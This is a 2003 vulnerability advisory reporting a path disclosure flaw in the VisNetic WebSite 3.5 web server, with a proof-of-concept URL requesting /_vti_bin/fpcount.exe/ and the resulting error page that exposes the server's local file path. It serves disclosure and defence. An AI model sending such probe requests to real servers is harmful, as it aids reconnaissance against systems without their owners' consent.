Subject: VisNetic WebSite Path Disclosure Vulnerability


Name: VisNetic WebSite Path Disclosure Vulnerability 
Date: 2nd of July 2003 
Software affected: VisNetic WebSite 3.5, Service release 17 
(prior versions are vulnerable) 
Advisory: http://www.krusesecurity.dk/advisories/vis0103.txt 
Vendor: http://www.deerfield.com/download/visnetic_website/
Risk: Low/Medium

Vendor Description: 

VisNetic Website, the first web server developed specifically for
Windows, 
can use almost any development platform, and includes features that
allow 
web developers to create powerful, flexible web sites. VisNetic WebSite 
is a secure windows-based web server that supports multiple domains, and
allows TLS/SSL secured domains. This web server also includes support
for 
a user database that can restrict access to content, and is immune to 
many of the security issues that may arise with other popular web
servers. 

Problem: 

When requesting a certain file from the vti-bin folder from Visnetic 
Website, a folder that doesn't exist, the error message returned will
reveal 
the absolute local path of the web folder on the target host's
filesystem. 

POC (simpel, eh?):
http://www.somehost.com/_vti_bin/fpcount.exe/

will return the following error 
(including the local path of the installed webpage): 

->

500 Server Error 

The server encountered an error and was unable to complete your request.


Message: Empty output from CGI program c:/localpath/_vti_bin/fpcount.exe


Please contact the server administrator at postmaster@...ehost.com and
inform them 
of the time the error occured, plus anything you know of that may have
caused the error. 

<-

As you can see, the data returned by Visnetic Website, includes
information about the 
local filesystem, that could be misused to gain sensitive information
about the 
configuration of the Remote host. 

Solution: 
The problem should, according to Visnetic, have been resolved in the
latest build of 
VisNetic WebSite that is available on the Visnetic Website download
page. 
This I canÂ´t confirm.

The update can be downloaded from the Visnetic WebSite administration
console, support 
tab, check for updates (at the bottom of the tab). 

Kind regards
